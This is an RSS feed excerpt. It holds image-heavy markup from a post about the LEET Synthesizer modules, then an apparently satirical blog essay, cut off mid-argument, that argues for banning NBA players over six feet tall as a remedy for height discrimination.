https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/chord-front.png?resize=300%2C88&amp;ssl=1 300w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/chord-front.png?resize=768%2C225&amp;ssl=1 768w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/chord-front.png?resize=1536%2C450&amp;ssl=1 1536w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/chord-front.png?resize=2048%2C600&amp;ssl=1 2048w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/chord-front.png?w=1480&amp;ssl=1 1480w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/chord-front.png?w=2220&amp;ssl=1 2220w" sizes="(max-width: 706px) 89vw, (max-width: 767px) 82vw, 740px" data-old-src="data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9JzIxNycgd2lkdGg9Jzc0MCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB2ZXJzaW9uPScxLjEnLz4="></amp-img></a><figcaption><a href="https://vonkonow.com/wordpress/leet-chord/">https://vonkonow.com/wordpress/leet-chord/</a></figcaption></figure>



<h2>LEET Pad</h2>



<figure><a href="https://vonkonow.com/wordpress/leet-pad/"><amp-img width="740" height="319" src="https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/pad-front.png?resize=740%2C319&amp;ssl=1" alt="" srcset="https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/pad-front.png?resize=1024%2C442&amp;ssl=1 1024w, https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/pad-front.png?resize=300%2C129&amp;ssl=1 300w, https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/pad-front.png?resize=768%2C331&amp;ssl=1 768w, https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/pad-front.png?resize=1536%2C663&amp;ssl=1 1536w, https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/pad-front.png?resize=2048%2C883&amp;ssl=1 2048w, https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/pad-front.png?w=1480&amp;ssl=1 1480w, https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/pad-front.png?w=2220&amp;ssl=1 2220w" sizes="(max-width: 706px) 89vw, (max-width: 767px) 82vw, 740px" layout="intrinsic" disable-inline-width="" i-amphtml-layout="intrinsic"><img loading="lazy" width="740" height="319" src="https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/pad-front.png?resize=740%2C319&amp;ssl=1" alt="" srcset="https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/pad-front.png?resize=1024%2C442&amp;ssl=1 1024w, https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/pad-front.png?resize=300%2C129&amp;ssl=1 300w, https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/pad-front.png?resize=768%2C331&amp;ssl=1 768w, https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/pad-front.png?resize=1536%2C663&amp;ssl=1 1536w, https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/pad-front.png?resize=2048%2C883&amp;ssl=1 2048w, https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/pad-front.png?w=1480&amp;ssl=1 1480w, https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/pad-front.png?w=2220&amp;ssl=1 2220w" sizes="(max-width: 706px) 89vw, (max-width: 767px) 82vw, 740px" data-old-src="data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9JzMxOScgd2lkdGg9Jzc0MCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB2ZXJzaW9uPScxLjEnLz4="></amp-img></a><figcaption><a href="https://vonkonow.com/wordpress/leet-pad/">https://vonkonow.com/wordpress/leet-pad/</a></figcaption></figure>



<h2>LEET Control8</h2>



<figure><a href="https://vonkonow.com/wordpress/leet-control8/"><amp-img width="740" height="319" src="https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/leet_control8_front.png?resize=740%2C319&amp;ssl=1" alt="" srcset="https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/leet_control8_front.png?resize=1024%2C442&amp;ssl=1 1024w, https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/leet_control8_front.png?resize=300%2C129&amp;ssl=1 300w, https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/leet_control8_front.png?resize=768%2C331&amp;ssl=1 768w, https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/leet_control8_front.png?resize=1536%2C663&amp;ssl=1 1536w, https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/leet_control8_front.png?resize=2048%2C883&amp;ssl=1 2048w, https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/leet_control8_front.png?w=1480&amp;ssl=1 1480w, https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/leet_control8_front.png?w=2220&amp;ssl=1 2220w" sizes="(max-width: 706px) 89vw, (max-width: 767px) 82vw, 740px" layout="intrinsic" disable-inline-width="" i-amphtml-layout="intrinsic"><img loading="lazy" width="740" height="319" src="https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/leet_control8_front.png?resize=740%2C319&amp;ssl=1" alt="" srcset="https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/leet_control8_front.png?resize=1024%2C442&amp;ssl=1 1024w, https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/leet_control8_front.png?resize=300%2C129&amp;ssl=1 300w, https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/leet_control8_front.png?resize=768%2C331&amp;ssl=1 768w, https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/leet_control8_front.png?resize=1536%2C663&amp;ssl=1 1536w, https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/leet_control8_front.png?resize=2048%2C883&amp;ssl=1 2048w, https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/leet_control8_front.png?w=1480&amp;ssl=1 1480w, https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/leet_control8_front.png?w=2220&amp;ssl=1 2220w" sizes="(max-width: 706px) 89vw, (max-width: 767px) 82vw, 740px" data-old-src="data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9JzMxOScgd2lkdGg9Jzc0MCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB2ZXJzaW9uPScxLjEnLz4="></amp-img></a><figcaption><a href="https://vonkonow.com/wordpress/leet-control8/">https://vonkonow.com/wordpress/leet-control8/</a></figcaption></figure>



<h2>LEET Control</h2>



<figure><a href="https://vonkonow.com/wordpress/leet-control/"><amp-img width="740" height="319" src="https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/leet_control-front.png?resize=740%2C319&amp;ssl=1" alt="" srcset="https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/leet_control-front.png?resize=1024%2C442&amp;ssl=1 1024w, https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/leet_control-front.png?resize=300%2C129&amp;ssl=1 300w, https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/leet_control-front.png?resize=768%2C331&amp;ssl=1 768w, https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/leet_control-front.png?resize=1536%2C663&amp;ssl=1 1536w, https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/leet_control-front.png?resize=2048%2C883&amp;ssl=1 2048w, https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/leet_control-front.png?w=1480&amp;ssl=1 1480w, https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/leet_control-front.png?w=2220&amp;ssl=1 2220w" sizes="(max-width: 706px) 89vw, (max-width: 767px) 82vw, 740px" layout="intrinsic" disable-inline-width="" i-amphtml-layout="intrinsic"><img loading="lazy" width="740" height="319" src="https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/leet_control-front.png?resize=740%2C319&amp;ssl=1" alt="" srcset="https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/leet_control-front.png?resize=1024%2C442&amp;ssl=1 1024w, https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/leet_control-front.png?resize=300%2C129&amp;ssl=1 300w, https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/leet_control-front.png?resize=768%2C331&amp;ssl=1 768w, https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/leet_control-front.png?resize=1536%2C663&amp;ssl=1 1536w, https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/leet_control-front.png?resize=2048%2C883&amp;ssl=1 2048w, https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/leet_control-front.png?w=1480&amp;ssl=1 1480w, https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/leet_control-front.png?w=2220&amp;ssl=1 2220w" sizes="(max-width: 706px) 89vw, (max-width: 767px) 82vw, 740px" data-old-src="data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9JzMxOScgd2lkdGg9Jzc0MCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB2ZXJzaW9uPScxLjEnLz4="></amp-img></a><figcaption><a href="https://vonkonow.com/wordpress/leet-control/">https://vonkonow.com/wordpress/leet-control/</a></figcaption></figure>



<h2>LEET Arpeggiator</h2>



<figure><a href="https://vonkonow.com/wordpress/leet-arpeggiator/"><amp-img width="740" height="319" src="https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/leet_arpeggiator_front.png?resize=740%2C319&amp;ssl=1" alt="" srcset="https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/leet_arpeggiator_front.png?resize=1024%2C442&amp;ssl=1 1024w, https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/leet_arpeggiator_front.png?resize=300%2C129&amp;ssl=1 300w, https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/leet_arpeggiator_front.png?resize=768%2C331&amp;ssl=1 768w, https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/leet_arpeggiator_front.png?resize=1536%2C663&amp;ssl=1 1536w, https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/leet_arpeggiator_front.png?resize=2048%2C883&amp;ssl=1 2048w, https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/leet_arpeggiator_front.png?w=1480&amp;ssl=1 1480w, https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/leet_arpeggiator_front.png?w=2220&amp;ssl=1 2220w" sizes="(max-width: 706px) 89vw, (max-width: 767px) 82vw, 740px" layout="intrinsic" disable-inline-width="" i-amphtml-layout="intrinsic"><img loading="lazy" width="740" height="319" src="https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/leet_arpeggiator_front.png?resize=740%2C319&amp;ssl=1" alt="" srcset="https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/leet_arpeggiator_front.png?resize=1024%2C442&amp;ssl=1 1024w, https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/leet_arpeggiator_front.png?resize=300%2C129&amp;ssl=1 300w, https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/leet_arpeggiator_front.png?resize=768%2C331&amp;ssl=1 768w, https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/leet_arpeggiator_front.png?resize=1536%2C663&amp;ssl=1 1536w, https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/leet_arpeggiator_front.png?resize=2048%2C883&amp;ssl=1 2048w, https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/leet_arpeggiator_front.png?w=1480&amp;ssl=1 1480w, https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/leet_arpeggiator_front.png?w=2220&amp;ssl=1 2220w" sizes="(max-width: 706px) 89vw, (max-width: 767px) 82vw, 740px" data-old-src="data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9JzMxOScgd2lkdGg9Jzc0MCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB2ZXJzaW9uPScxLjEnLz4="></amp-img></a><figcaption><a href="https://vonkonow.com/wordpress/leet-arpeggiator/">https://vonkonow.com/wordpress/leet-arpeggiator/</a></figcaption></figure>



<h2>LEET Sequencer</h2>



<figure><a href="https://vonkonow.com/wordpress/leet-sequencer/"><amp-img width="740" height="582" src="https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/leet_sequencer_display.png?resize=740%2C582&amp;ssl=1" alt="" srcset="https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/leet_sequencer_display.png?resize=1024%2C805&amp;ssl=1 1024w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/leet_sequencer_display.png?resize=300%2C236&amp;ssl=1 300w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/leet_sequencer_display.png?resize=768%2C604&amp;ssl=1 768w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/leet_sequencer_display.png?resize=1536%2C1208&amp;ssl=1 1536w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/leet_sequencer_display.png?w=1480&amp;ssl=1 1480w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/leet_sequencer_display.png?w=2220&amp;ssl=1 2220w" sizes="(max-width: 706px) 89vw, (max-width: 767px) 82vw, 740px" layout="intrinsic" disable-inline-width="" i-amphtml-layout="intrinsic"><img loading="lazy" width="740" height="582" src="https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/leet_sequencer_display.png?resize=740%2C582&amp;ssl=1" alt="" srcset="https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/leet_sequencer_display.png?resize=1024%2C805&amp;ssl=1 1024w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/leet_sequencer_display.png?resize=300%2C236&amp;ssl=1 300w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/leet_sequencer_display.png?resize=768%2C604&amp;ssl=1 768w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/leet_sequencer_display.png?resize=1536%2C1208&amp;ssl=1 1536w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/leet_sequencer_display.png?w=1480&amp;ssl=1 1480w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/leet_sequencer_display.png?w=2220&amp;ssl=1 2220w" sizes="(max-width: 706px) 89vw, (max-width: 767px) 82vw, 740px" data-old-src="data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9JzU4Micgd2lkdGg9Jzc0MCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB2ZXJzaW9uPScxLjEnLz4="></amp-img></a><figcaption><a href="https://vonkonow.com/wordpress/leet-sequencer/">https://vonkonow.com/wordpress/leet-sequencer/</a></figcaption></figure>



<p>LEET Linux</p>



<figure><amp-img width="740" height="321" src="https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/12/leet_linux.png?resize=740%2C321&amp;ssl=1" alt="" srcset="https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/12/leet_linux.png?resize=1024%2C444&amp;ssl=1 1024w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/12/leet_linux.png?resize=300%2C130&amp;ssl=1 300w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/12/leet_linux.png?resize=768%2C333&amp;ssl=1 768w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/12/leet_linux.png?resize=1536%2C666&amp;ssl=1 1536w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/12/leet_linux.png?resize=2048%2C888&amp;ssl=1 2048w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/12/leet_linux.png?w=1480&amp;ssl=1 1480w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/12/leet_linux.png?w=2220&amp;ssl=1 2220w" sizes="(max-width: 706px) 89vw, (max-width: 767px) 82vw, 740px" layout="intrinsic" disable-inline-width="" i-amphtml-layout="intrinsic"><img loading="lazy" width="740" height="321" src="https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/12/leet_linux.png?resize=740%2C321&amp;ssl=1" alt="" srcset="https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/12/leet_linux.png?resize=1024%2C444&amp;ssl=1 1024w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/12/leet_linux.png?resize=300%2C130&amp;ssl=1 300w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/12/leet_linux.png?resize=768%2C333&amp;ssl=1 768w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/12/leet_linux.png?resize=1536%2C666&amp;ssl=1 1536w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/12/leet_linux.png?resize=2048%2C888&amp;ssl=1 2048w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/12/leet_linux.png?w=1480&amp;ssl=1 1480w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/12/leet_linux.png?w=2220&amp;ssl=1 2220w" sizes="(max-width: 706px) 89vw, (max-width: 767px) 82vw, 740px" data-old-src="data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9JzMyMScgd2lkdGg9Jzc0MCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB2ZXJzaW9uPScxLjEnLz4="></amp-img><figcaption><a href="https://vonkonow.com/wordpress/leet-linux/">https://vonkonow.com/wordpress/leet-linux/</a></figcaption></figure>



<h2>LEET Accessories</h2>



<figure><a href="https://github.com/vonkonow/LEET-Synthesizer/tree/main/Accessories"><amp-img width="740" height="409" src="https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/leet_accessories.jpg?resize=740%2C409&amp;ssl=1" alt="" srcset="https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/leet_accessories-scaled.jpg?resize=1024%2C566&amp;ssl=1 1024w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/leet_accessories-scaled.jpg?resize=300%2C166&amp;ssl=1 300w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/leet_accessories-scaled.jpg?resize=768%2C425&amp;ssl=1 768w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/leet_accessories-scaled.jpg?resize=1536%2C849&amp;ssl=1 1536w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/leet_accessories-scaled.jpg?resize=2048%2C1132&amp;ssl=1 2048w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/leet_accessories-scaled.jpg?w=1480&amp;ssl=1 1480w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/leet_accessories-scaled.jpg?w=2220&amp;ssl=1 2220w" sizes="(max-width: 706px) 89vw, (max-width: 767px) 82vw, 740px" layout="intrinsic" disable-inline-width="" i-amphtml-layout="intrinsic"><img loading="lazy" width="740" height="409" src="https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/leet_accessories.jpg?resize=740%2C409&amp;ssl=1" alt="" srcset="https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/leet_accessories-scaled.jpg?resize=1024%2C566&amp;ssl=1 1024w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/leet_accessories-scaled.jpg?resize=300%2C166&amp;ssl=1 300w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/leet_accessories-scaled.jpg?resize=768%2C425&amp;ssl=1 768w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/leet_accessories-scaled.jpg?resize=1536%2C849&amp;ssl=1 1536w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/leet_accessories-scaled.jpg?resize=2048%2C1132&amp;ssl=1 2048w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/leet_accessories-scaled.jpg?w=1480&amp;ssl=1 1480w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/leet_accessories-scaled.jpg?w=2220&amp;ssl=1 2220w" sizes="(max-width: 706px) 89vw, (max-width: 767px) 82vw, 740px" data-old-src="data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9JzQwOScgd2lkdGg9Jzc0MCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB2ZXJzaW9uPScxLjEnLz4="></amp-img></a><figcaption><a href="https://github.com/vonkonow/LEET-Synthesizer/tree/main/Accessories">https://github.com/vonkonow/LEET-Synthesiz‚Ä¶</a></figcaption></figure></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://vonkonow.com/wordpress/leet-synthesizer/">https://vonkonow.com/wordpress/leet-synthesizer/</a></em></p>]]>
            </description>
            <link>https://vonkonow.com/wordpress/leet-synthesizer/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25806661</guid>
            <pubDate>Sat, 16 Jan 2021 23:47:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Anyone over 6-feet should be Banned from the NBA]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25806630">thread link</a>) | @whack
<br/>
January 16, 2021 | https://outlookzen.com/2014/06/01/anyone-over-6-feet-should-be-banned-from-the-nba/ | <a href="https://web.archive.org/web/*/https://outlookzen.com/2014/06/01/anyone-over-6-feet-should-be-banned-from-the-nba/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<div><figure><a href="https://www.timesunion.com/sports/article/Knicks-use-height-advantage-to-beat-Magic-10970747.php#item-85307-tbla-2" target="_blank" rel="noreferrer noopener"><img loading="lazy" data-attachment-id="752" data-permalink="https://outlookzen.com/nba/" data-orig-file="https://outlookzen.files.wordpress.com/2019/05/nba.jpg" data-orig-size="747,920" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="nba" data-image-description="" data-medium-file="https://outlookzen.files.wordpress.com/2019/05/nba.jpg?w=244" data-large-file="https://outlookzen.files.wordpress.com/2019/05/nba.jpg?w=747" src="https://outlookzen.files.wordpress.com/2019/05/nba.jpg" alt="" width="560" height="690" srcset="https://outlookzen.files.wordpress.com/2019/05/nba.jpg?w=560&amp;h=690 560w, https://outlookzen.files.wordpress.com/2019/05/nba.jpg?w=122&amp;h=150 122w, https://outlookzen.files.wordpress.com/2019/05/nba.jpg?w=244&amp;h=300 244w, https://outlookzen.files.wordpress.com/2019/05/nba.jpg 747w" sizes="(max-width: 560px) 100vw, 560px"></a></figure></div>


<p>We as a society recognize that discriminating against someone based on the color of their skin, or sexual orientation, is flat out wrong. That discriminating on the basis of inborn qualities that cannot be controlled by the individual, is deeply &amp; fundamentally unfair.</p>
<p>Well, what about height?</p>
<p>Is it ok for major institutions in our society to discriminate on the basis of height, when choosing who to hire? I would certainly hope not. Just like racial discrimination, I‚Äôm sure certain small amounts of height discrimination are bound to occur. But if we see an organization or institution where such discrimination is glaringly obvious &amp; easily proven, shouldn‚Äôt we as a society step in &amp; try to remedy this in the best way we can?</p>
<p>Let‚Äôs take a look at the epicenter of height-discrimination: <a href="http://www.besttickets.com/blog/wp-content/uploads/2013/10/Height-and-Weight.png?e9aabb" target="_blank" rel="noopener">The NBA</a></p>
<ul>
<li><a href="http://www.census.gov/compendia/statab/2012/tables/12s0209.pdf" target="_blank" rel="noopener"><b>42%</b> of American males are 5‚Äô9 or shorter</a>. And yet, <b>0.45%</b> of NBA players fall into this category.</li>
<li><b>80%</b> of American males are under 6 feet tall. And yet, only <b>3.5%</b> of NBA players can say the time.</li>
<li><strong>99.9%</strong> of American males are 6‚Äô4 or shorter. And yet, the <em>average</em> height in the NBA is still <strong>6‚Äô7</strong>.</li>
</ul>
<p>Assuming basketball as a sport did not penalize players for their height, we would expect there to be:</p>
<ul>
<li><b>360 </b>NBA players under 6 feet in height</li>
<li><b>90 </b>NBA players over 6 feet in height</li>
</ul>
<p>What the numbers currently look like:</p>
<ul>
<li><b>16 </b>NBA players under 6 feet in height</li>
<li><b>434 </b>NBA players over 6 feet in height</li>
</ul>
<p>Under the current NBA rules, the number of under-6-feet people who were denied the opportunity to play in the NBA due to height discrimination: <b>344</b></p>
<p>The number of over-6-feet people who became NBA players due to height-discrimination in their favor: <b>344</b></p>
<p>That‚Äôs right. Out of 450 players in the NBA, <b>76%</b>&nbsp;of them are only there due to height discrimination. These 344 players are keeping out others who deserve their spot, but were denied this dream due to height discrimination.</p>
<p>Now what if we considered a drastic solution: <strong>Ban anyone over 6-feet in height from playing in the NBA.</strong></p>
<p>What the player height distribution would now look like:</p>
<ul>
<li>450 NBA players under 6-feet</li>
<li>0 players over 6-feet</li>
</ul>
<p>Compare this to the ideal &amp; fair height distribution:</p>
<ul>
<li>360 under 6 feet</li>
<li>90 over 6 feet</li>
</ul>
<p>Net result under this new policy: 90 players would be unfairly locked out of the NBA due to height-discrimination. However, these 90 players only represent 20% of the NBA players.</p>
<p>Hence, by instituting this ban-on-anyone-over-6-feet, we can cut down the number of undeserving NBA players <b>from 76%</b> of the player base, <b>to 20%</b>. This solution may not be perfect, but anytime we can cut down discrimination from 76% to 20%, that‚Äôs a <em>huge</em> win worth pursuing.</p>
<p>The argument in favor of instituting this ban seems obvious: Cutting down discrimination by an order of magnitude and making the NBA accessible to the vast majority of Americans. Are there any reasons why we shouldn‚Äôt pursue this ban?</p>
<p><strong><i>‚ÄúBanning tall players would make the games less fun to watch.‚Äù</i></strong></p>
<p><span>Completely bogus. Player height in the NBA is just like Einstein‚Äôs famous theory; it‚Äôs all relative. If every single NBA player shrunk by 12-inches right before the start of the game, and </span><i>the basketball hoop was lowered</i><span> by 12-inches as well to compensate, the audience would never know the difference. The game would play itself out in almost the exact same way, and it would be exactly as enjoyable to watch as it was before.</span></p>
<p><strong><i>‚ÄúShorter people are less athletic than tall people, and therefore, deserve to be underrepresented.‚Äù</i> </strong></p>
<p>Again, completely bogus. For any person not suffering from &nbsp;malnutrition, his height is 99% determined by genetics, and is absolutely independent of how fit, healthy, agile or dextrous he is. Shorter men are just as athletic as taller men, and would be equally represented in any sport that doesn‚Äôt discriminate on the basis of height. Looking at Football (Soccer) for example, a sport that demands just as much athleticism as basketball, statistics show that <a href="https://en.wikipedia.org/wiki/Height_in_sports#Association_football" target="_blank" rel="noopener">professional footballers have heights that match that of the general population</a>.</p>
<p><strong><i>‚ÄúWhat about people who are stronger or more fit? Aren‚Äôt they overrepresented? Should we ban them too?‚Äù</i></strong></p>
<p>Of course not. Unlike height, these other qualities like strength &amp; speed can be trained &amp; developed by anyone. Our society rewards people for earned talents, such as educational or technical proficiency, all the time. Height, on the other hand, isn‚Äôt an earned quality. It‚Äôs more like race, something we are innately born with &amp; cannot alter. Hence why it is immoral to discriminate on the basis of these innate qualities.</p>
<p><strong><i>‚ÄúA player‚Äôs height is instrumental in fulfilling the job role. Hence why discriminating on the basis of height should be allowed.‚Äù</i></strong></p>
<p>This is only true under current NBA rules. Team owners are forced to discriminate on the basis of height when hiring players, because the only players who can successfully fulfill the job role tend to be tall players. However, changing the NBA rules to ban over-6-feet players would resolve this dilemma. A 5‚Äô10 player would now be able to fulfill the job role if he trains hard enough, and can thus earn his spot on the team. And the business customers for their part (spectators), would find themselves watching a game that is just as exciting and entertaining as it always was.</p>
<p><strong><i>‚ÄúThis new rule discriminates against people who are tall!‚Äù</i> </strong></p>
<p>Guilty as charged. But which is worse? Discriminating against <b>344 individuals</b> for <b>being too short</b>? Or discriminating against <b>60 individuals</b> for being too tall? Imposing a 6-foot-height maximum rule would cut down discrimination in the NBA <b>from 76% to 20%</b>. Ideally, we should find some way to remedy even this problem. However, just like in the real world, we can never reach an ideal solution. But that shouldn‚Äôt stop us from taking steps in the right direction.</p>
<p><strong><i>‚ÄúWhat about players who are 5‚Äô8 or shorter? Under this new rule, wouldn‚Äôt someone who‚Äôs 5‚Äô11 still have an unfair advantage over them?‚Äù</i> </strong></p>
